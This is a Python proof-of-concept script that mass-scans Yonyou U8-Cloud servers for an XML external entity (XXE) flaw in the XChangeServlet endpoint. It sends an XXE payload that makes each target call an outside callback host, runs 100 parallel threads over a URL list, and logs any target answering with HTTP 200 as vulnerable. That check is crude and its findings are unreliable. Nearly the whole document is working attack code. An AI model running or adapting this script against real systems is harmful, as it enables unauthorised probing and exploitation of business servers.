#用友U8-Cloud系统 XChangeServlet XML外部实体注入漏洞(XXE)

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''
 .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. |
| |  ____  ____  | || |  ____  ____  | || |  _________   | |
| | |_  _||_  _| | || | |_  _||_  _| | || | |_   ___  |  | |
| |   \ \  / /   | || |   \ \  / /   | || |   | |_  \_|  | |
| |    > `' <    | || |    > `' <    | || |   |  _|  _   | |
| |  _/ /'`\ \_  | || |  _/ /'`\ \_  | || |  _| |___/ |  | |
| | |____||____| | || | |____||____| | || | |_________|  | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------' 
                                    version:Yongyouu8-Cloud_XChangeServlet_XXE 1.0
                                     Author: Laow🚦
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友U8-Cloud系统 XChangeServlet XML外部实体注入漏洞(XXE)")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/service/XChangeServlet'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", 
        "Connection": "close", 
        "Content-Type": "text/xml", 
        "Accept-Encoding": "gzip"
        }
    data = "<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM \"https://laow.eyes.sh\">]><r><a>&xxe;</a ></r>\r\n"
    
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try:
        response = requests.post(url=url,headers=headers,data=data,proxies=proxies,timeout=5,verify=False)
        # print(response.headers)
        if response.status_code == 200:
            print( f"{GREEN}[+] {url} 存在XXE漏洞！{RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass

if __name__ == '__main__':
    main()
